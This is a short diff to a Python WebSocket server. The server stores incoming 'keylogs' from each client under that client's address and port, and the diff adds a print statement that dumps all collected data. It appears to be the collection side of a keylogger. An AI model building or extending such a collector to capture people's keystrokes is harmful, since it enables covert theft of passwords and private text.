@@ -5,6 +5,7 @@ keylogs = json.loads('{}')
 
 class SocketServer(WebSocket):
     def handleMessage(self):
+        print(keylogs)
         clientKeylogs = keylogs[str(self.address[0]) + "-" + str(self.address[1])]
         clientKeylogs.append(self.data)
         keylogs[str(self.address[0]) + "-" + str(self.address[1])] = clientKeylogs
